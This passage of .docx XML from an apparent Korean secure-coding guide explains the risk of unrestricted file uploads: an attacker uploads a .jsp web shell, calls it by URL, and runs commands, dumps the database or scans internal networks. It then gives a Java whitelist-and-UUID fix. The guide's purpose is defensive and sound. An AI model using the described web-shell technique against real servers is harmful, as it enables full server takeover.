                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">// </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> .jsp, .php </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>업로드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>후</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>웹에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>확장자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>업로드를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>허용하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> .jsp </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>웹쉘</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>올린</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>뒤</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>브라우저에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> URL</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>호출해</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>임의의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>명령을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. DB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>덤프</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>내부망</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>스캔</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>추가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>악성코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>배포</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>완전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>탈취로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이어질</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>허용</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>확장자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>화이트리스트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검사</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>List&lt;String&gt; allowed = Arrays.asList("jpg","png","gif","pdf","xlsx");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String ext = FilenameUtils.getExtension(filename).toLowerCase();</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>if (!allowed.contains(ext)) throw new Exception("</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>허용되지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>않는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>파일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>형식</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">// </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>파일명을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> UUID</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>변경</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">, web root </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>외부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>경로에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>저장</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String savedName = UUID.randomUUID().toString() + "." + ext;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>file.transferTo(new File("C:/files/upload/" + savedName));</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
